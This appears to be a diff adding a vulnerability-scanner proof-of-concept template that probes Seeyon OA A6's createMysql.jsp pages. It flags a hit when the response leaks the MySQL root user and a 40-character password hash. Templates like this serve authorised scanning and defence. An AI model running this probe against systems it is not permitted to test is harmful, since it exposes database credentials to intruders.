@@ -1,0 +1,17 @@
+id: poc-yaml-seeyon-a6-createmysql-information-leak
+info:
+  name: 致远OA A6 createMysql.jsp 信息泄露
+  severity: medium
+  tags:
+  - sql-injection
+  finger: 致远互联-OA
+variables:
+  path: '/yyoa/createMysql.jsp
+
+    /yyoa/ext/createMysql.jsp'
+requests:
+- method: GET
+  path: '{{.path}}'
+  expression: status_code == 200 && contains(body, "root</br>") &&  matches(body,
+    "[*][0-zA-Z]{40}</br>")
+transport: http
